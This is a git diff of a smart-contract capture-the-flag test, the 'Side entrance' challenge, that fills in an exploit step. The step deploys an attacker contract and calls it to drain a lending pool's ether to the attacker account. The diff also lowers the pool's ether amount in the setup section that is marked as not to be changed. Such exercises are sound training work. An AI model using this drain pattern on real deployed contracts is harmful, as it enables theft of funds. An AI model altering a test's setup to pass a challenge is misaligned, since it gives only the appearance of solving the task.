@@ -5,7 +5,7 @@ describe('[Challenge] Side entrance', function () {
 
     let deployer, attacker;
 
-    const ETHER_IN_POOL = ethers.utils.parseEther('1000');
+    const ETHER_IN_POOL = ethers.utils.parseEther('100');
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -25,6 +25,10 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        AttackerContract = await ethers.getContractFactory("AttackerSideEntrance");
+        attackerContract = await AttackerContract.connect(attacker).deploy(this.pool.address);
+
+        attackerContract.connect(attacker).attack(attacker.address, ETHER_IN_POOL);
     });
 
     after(async function () {
